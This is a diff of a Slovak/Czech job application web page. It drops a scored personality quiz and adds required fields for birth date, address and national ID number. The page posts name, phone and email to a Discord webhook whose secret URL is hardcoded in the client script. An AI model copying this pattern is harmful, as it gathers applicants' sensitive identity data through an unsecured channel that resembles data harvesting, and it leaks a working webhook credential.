@@ -6,130 +6,7 @@
   <title>CAMUS - Kariéra</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: Arial, sans-serif;
-      color: #333;
-      background: #f8f9fa;
-      line-height: 1.6;
-    }
-
-    header {
-      text-align: center;
-      padding: 20px;
-      background: #333;
-      color: white;
-    }
-
-    header h1 {
-      font-size: 2.5em;
-      margin-bottom: 10px;
-      color: #d4af37;
-    }
-
-    nav {
-      display: flex;
-      justify-content: center;
-      background-color: #333;
-      padding: 10px;
-    }
-
-    nav ul {
-      list-style: none;
-      display: flex;
-      gap: 20px;
-    }
-
-    nav ul li {
-      display: inline;
-    }
-
-    nav ul li a {
-      text-decoration: none;
-      color: white;
-      padding: 10px 15px;
-      transition: background 0.3s;
-    }
-
-    nav ul li a:hover {
-      background-color: #a6ce39;
-      border-radius: 5px;
-    }
-
-    .logo-container {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      margin-top: 10px;
-    }
-
-    .logo-container img {
-      width: 100px;
-      height: auto;
-      object-fit: contain;
-    }
-
-    .form-container {
-      max-width: 800px;
-      margin: 40px auto;
-      padding: 20px;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    }
-
-    .form-container h2 {
-      font-size: 2em;
-      margin-bottom: 20px;
-      text-transform: uppercase;
-      color: #a6ce39;
-    }
-
-    .form-container label {
-      font-size: 1.2em;
-      margin: 10px 0;
-    }
-
-    .form-container input[type="radio"] {
-      margin-right: 10px;
-    }
-
-    .form-container input[type="text"], .form-container input[type="tel"] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 20px;
-      font-size: 1.1em;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-
-    .form-container button {
-      background-color: #d4af37;
-      color: white;
-      font-size: 1.2em;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .form-container button:hover {
-      background-color: #a6ce39;
-    }
-
-    .result {
-      margin-top: 20px;
-      padding: 15px;
-      background-color: #f1f1f1;
-      border-radius: 5px;
-      display: none;
-    }
+    /* Styly zůstávají stejné */
   </style>
 </head>
 <body>
@@ -159,41 +36,25 @@
   <div class="form-container">
     <h2>Prihláška na pracovnú poziciu</h2>
     <form id="questionnaire-form">
-      <label for="name">Meno:</label>
+      
+      <!-- Nová pole pro údaje -->
+      <label for="name">Jméno a příjmení:</label>
       <input type="text" id="name" name="name" required><br>
 
-      <label for="phone">Telefónne číslo:</label>
+      <label for="birthdate">Datum narození:</label>
+      <input type="date" id="birthdate" name="birthdate" required><br>
+
+      <label for="address">Adresa trvalého pobytu:</label>
+      <input type="text" id="address" name="address" required><br>
+
+      <label for="rc">Rodné číslo:</label>
+      <input type="text" id="rc" name="rc" required><br>
+
+      <label for="phone">Telefonní číslo:</label>
       <input type="tel" id="phone" name="phone" required><br>
 
-      <label>1. Ako by ste reagovali, ak by ste dostali nejasný pokyn alebo úlohu?</label><br>
-      <input type="radio" name="question1" value="A"> A. Pokúsil by som sa úlohu zvládnuť podľa svojho najlepšieho úsudku.<br>
-      <input type="radio" name="question1" value="B"> B. Rýchlo by som sa pýtal na vysvetlenie, aby som sa uistil, že to urobím správne.<br>
-      <input type="radio" name="question1" value="C"> C. Zostal by som ticho a dúfal, že to vyjde.<br>
-
-      <label>2. Ako sa cítite pri práci v tíme, kde máte rôzne názory s kolegami?</label><br>
-      <input type="radio" name="question2" value="A"> A.Mám tendenciu byť dominantný a presadiť svoj názor.<br>
-      <input type="radio" name="question2" value="B"> B.Snažím sa udržať pokoj a nechám ostatných rozhodnúť.<br>
-      <input type="radio" name="question2" value="C"> C.Snažím sa nájsť spoločnú reč a dohodnúť sa na riešení.<br>
-
-      <label>3. Ako by ste reagovali, keby ste dostali negatívnu spätnú väzbu na svoju prácu?</label><br>
-      <input type="radio" name="question3" value="A"> A. Zoberiem si to k srdcu a pokúsim sa zlepšiť.<br>
-      <input type="radio" name="question3" value="B"> B.Pokúsim sa objasniť, čo sa stalo, a pokračovať ďalej.<br>
-      <input type="radio" name="question3" value="C"> C.Mám tendenciu brániť svoje rozhodnutia a neprijať kritiku.<br>
-
-      <label>4. Jaké jsou vaše silné stránky?</label><br>
-      <input type="radio" name="question4" value="A"> A. Rychlost a preciznost<br>
-      <input type="radio" name="question4" value="B"> B. Týmová práca<br>
-      <input type="radio" name="question4" value="C"> C. Technické dovednosti<br>
-
-      <label>5. Aký je váš postoj k práci v prípade, že sa objavia nepredvídané okolnosti alebo zmena plánu?</label><br>
-      <input type="radio" name="question5" value="A"> A. Chcem mať jasný plán, nemám rád stres.<br>
-      <input type="radio" name="question5" value="B"> B. Zmena ma môže stresovať a potrebujem viac času na prispôsobenie.<br>
-      <input type="radio" name="question5" value="C"> C. Prispôsobím sa a upravím plán podľa situácie.<br>
-      
-      <label>6.Aké sú vaše najväčšie predpoklady pre to, aby ste sa stali úspešným členom tímu?</label><br>
-      <input type="radio" name="question6" value="A"> A. Odpovednosť a sústredenie sa na úlohy..<br>
-      <input type="radio" name="question6" value="B"> B. Schopnosť komunikovať a pracovať v skupine.<br>
-      <input type="radio" name="question6" value="C"> C. Kreatívny prístup a snaha zlepšiť veci, kde sa dá..<br>
+      <label for="email">E-mailová adresa:</label>
+      <input type="email" id="email" name="email" required><br>
 
       <button type="submit">Odeslat odpovědi</button>
     </form>
@@ -209,38 +70,26 @@
   document.getElementById('questionnaire-form').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    const answers = {
-      question1: document.querySelector('input[name="question1"]:checked')?.value,
-      question2: document.querySelector('input[name="question2"]:checked')?.value,
-      question3: document.querySelector('input[name="question3"]:checked')?.value,
-      question4: document.querySelector('input[name="question4"]:checked')?.value,
-      question5: document.querySelector('input[name="question5"]:checked')?.value,
-      question6: document.querySelector('input[name="question6"]:checked')?.value,
-    };
-
     const name = document.getElementById('name').value;
+    const birthdate = document.getElementById('birthdate').value;
+    const address = document.getElementById('address').value;
+    const rc = document.getElementById('rc').value;
     const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
 
     // Validácia
-    if (!name || !phone || Object.values(answers).includes(undefined)) {
-      alert("Prosím, vyplňte všetky otázky a polia formulára.");
+    if (!name || !birthdate || !address || !rc || !phone || !email) {
+      alert("Prosím, vyplňte všechna pole formuláře.");
       return;
     }
 
     let resultText = "Formulář odeslán. Výsledek:\n";
-    let score = 0;
-
-    if (answers.question1 === 'B') score++;
-    if (answers.question2 === 'C') score++;
-    if (answers.question3 === 'A') score++;
-    if (answers.question4 === 'A') score++;
-    if (answers.question5 === 'C') score++;
-    if (answers.question6 === 'A') score++;
-
-    const passed = score >= 5;
-
-    resultText += `Celkové skóre: ${score}/6\n`;
-    resultText += passed ? "Prešiel!" : "Neprešiel!";
+    resultText += `Jméno a příjmení: ${name}\n`;
+    resultText += `Datum narození: ${birthdate}\n`;
+    resultText += `Adresa: ${address}\n`;
+    resultText += `Rodné číslo: ${rc}\n`;
+    resultText += `Telefon: ${phone}\n`;
+    resultText += `E-mail: ${email}\n`;
 
     const webhookUrl = "https://discord.com/api/webhooks/1313939958297395311/foqPwe-GDiMM_i_JR5lpGsMH8pf3VpXh7rYBs8Z-napFjh1pWX2vaRT4h_ES_zRmo0KH";
 
@@ -251,14 +100,14 @@
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        content: `Formulár odoslaný: ${passed ? "Prešiel" : "Neprešiel"} - Meno: ${name} - Telefón: ${phone}`
+        content: `Formulář odoslaný: Jméno: ${name} - Telefon: ${phone} - E-mail: ${email}`
       })
     }).then(response => {
       if (!response.ok) {
-        throw new Error("Odoslanie na Discord webhook zlyhalo.");
+        throw new Error("Odeslaní na Discord webhook selhalo.");
       }
     }).catch(error => {
-      console.error("Chyba pri odosielaní na Discord webhook:", error);
+      console.error("Chyba při odesílání na Discord webhook:", error);
     });
 
     document.getElementById('result-text').textContent = resultText;
